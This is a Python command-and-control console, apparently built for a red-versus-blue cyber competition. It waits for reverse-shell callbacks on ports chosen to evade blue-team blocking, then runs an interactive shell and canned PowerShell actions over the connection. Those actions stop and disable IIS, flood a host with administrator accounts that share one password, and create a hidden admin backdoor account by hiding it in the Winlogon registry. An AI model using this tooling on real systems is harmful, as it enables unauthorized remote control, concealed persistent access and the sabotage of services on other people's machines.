import socket
import time
import random
import threading
import argparse

# Shared port list — ordered by priority
# Ports blue team can't block without killing their own scored services come first
PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]

NAME_POOLS = {
    "USA": [
        "james_brooks", "michael_reed", "david_lane", "robert_hayes",
        "william_ford", "thomas_grant", "charles_bell", "daniel_shaw",
        "matthew_cole", "andrew_ross", "ryan_price", "kevin_hunt",
        "brian_stone", "steven_wade", "paul_bishop", "mark_burns",
        "jason_marsh", "eric_norris", "scott_quinn", "jeffrey_page"
    ],
    "USSR": [
        "nikolai_petrov", "ivan_sorokin", "dmitri_volkov", "alexei_morozov",
        "sergei_kozlov", "pavel_novikov", "mikhail_lebedev", "andrei_popov",
        "boris_fedorov", "viktor_orlov", "yuri_sobolev", "konstantin_zhukov",
        "roman_nikitin", "igor_kuznetsov", "oleg_stepanov", "evgeni_frolov",
        "anatoli_baranov", "vladislav_egorov", "georgi_semyonov", "pyotr_kulikov"
    ]
}

# Shared connection object accessible across threads
active_conn = None
active_conn_lock = threading.Lock()

def send_command(conn, command):
    conn.send((command + "\n").encode("utf-8"))
    time.sleep(3)
    response = b""
    conn.settimeout(5)
    try:
        while True:
            chunk = conn.recv(8192)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    return response.decode("utf-8", errors="ignore")

def listen_on_port(port, result_holder):
    """
    Spin up a listener on a single port.
    First one to get a connection wins and stores it in result_holder.
    """
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(1)
        server.settimeout(300)  # wait up to 5 min per port
        print(f"[*] Listening on port {port}...")
        conn, addr = server.accept()

        with active_conn_lock:
            if result_holder["conn"] is None:
                result_holder["conn"] = conn
                result_holder["port"] = port
                result_holder["addr"] = addr[0]
                print(f"\n[+] Connection from {addr[0]} on port {port}")
    except Exception:
        pass
    finally:
        try:
            server.close()
        except Exception:
            pass
# Spawns a listener thread for every port simultaneously
def wait_for_connection():
    result_holder = {"conn": None, "port": None, "addr": None}
    threads = []

    for port in PORTS:
        t = threading.Thread(
            target=listen_on_port,
            args=(port, result_holder),
            daemon=True
        )
        t.start()
        threads.append(t)

    # Wait until one connection is established
    print(f"[*] Listening on {len(PORTS)} ports simultaneously: {PORTS}")
    while result_holder["conn"] is None:
        time.sleep(0.5)

    return result_holder["conn"], result_holder["port"]

def make_user_command(username, admin=False):
    password = "Welcome1!"
    cmd = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    if admin:
        cmd += f'; Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    return cmd

def get_name_queue(team):
    pool = NAME_POOLS[team][:]
    random.shuffle(pool)
    return pool

def flood_users(conn, team, count, delay=0):
    queue = get_name_queue(team)
    used = []
    created = 0
    print(f"\n[*] Starting user drop — {count} users, {delay}s delay each\n")
    while created < count:
        if not queue:
            print("[*] Name queue exhausted, reshuffling...")
            queue = [n for n in get_name_queue(team) if n not in used[-10:]]
        username = queue.pop(0)
        used.append(username)
        cmd = make_user_command(username, admin=True)
        print(f"[+] Creating user ({created + 1}/{count}): {username}")
        result = send_command(conn, cmd)
        if result.strip():
            print(result)
        created += 1
        if delay > 0 and created < count:
            print(f"[*] Waiting {delay}s before next user...")
            time.sleep(delay)
    print(f"\n[+] Done. {count} users created.")

def create_hidden_user(conn):
    username = "svc_diag"
    password = "Diag$2024!"
    cmd_create = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    cmd_admin  = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    cmd_hide   = (
        f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
        f'\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
        f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
    )
    print(f"\n[*] Creating hidden user: {username}")
    print(send_command(conn, cmd_create))
    print(send_command(conn, cmd_admin))
    print(send_command(conn, cmd_hide))
    print(f"[+] Done. Hidden user '{username}' | password: {password}")

def user_flood_menu(conn, team):
    while True:
        print(f"\n--- User Flood Menu [{team}] ---")
        print("  [1] Drop 10 users instantly")
        print("  [2] Slow drip — 1 user every 5 min (up to 5)")
        print("  [3] Create 1 hidden admin user")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "1":
            flood_users(conn, team, count=10, delay=0)
        elif choice == "2":
            t = threading.Thread(
                target=flood_users,
                args=(conn, team, 5, 300),
                daemon=True
            )
            t.start()
            print("[*] Slow drip running in background.")
        elif choice == "3":
            create_hidden_user(conn)

def automation_menu(conn, team):
    automations = {
        "1": ("Disable IIS",       "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
        "2": ("Check IIS status",  "Get-Service -Name W3SVC | Select-Object Status"),
        "3": ("Whoami + hostname", "whoami; hostname"),
        "4": ("List local admins", "Get-LocalGroupMember -Group Administrators"),
        "5": ("User flood",        None),
    }
    while True:
        print(f"\n--- Automation Menu [{team}] ---")
        for key, (label, _) in automations.items():
            print(f"  [{key}] {label}")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "5":
            user_flood_menu(conn, team)
        elif choice in automations:
            label, cmd = automations[choice]
            print(f"\n[*] Running: {label}")
            print(send_command(conn, cmd))

def interactive_mode(conn):
    print("[*] Interactive mode. Type 'back' to return to menu.\n")
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "back":
            break
        if cmd:
            print(send_command(conn, cmd))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--team",
        choices=["USA", "USSR"],
        required=True,
        help="Which blue team this terminal is targeting"
    )
    args = parser.parse_args()
    team = args.team

    conn, port = wait_for_connection()

    while True:
        print(f"\n=== C2 Menu [{team}] | connected on port {port} ===")
        print("  [1] Interactive shell")
        print("  [2] Automations")
        print("  [3] Exit")
        choice = input("Select> ").strip()
        if choice == "1":
            interactive_mode(conn)
        elif choice == "2":
            automation_menu(conn, team)
        elif choice == "3":
            conn.close()
            break

if __name__ == "__main__":
    main()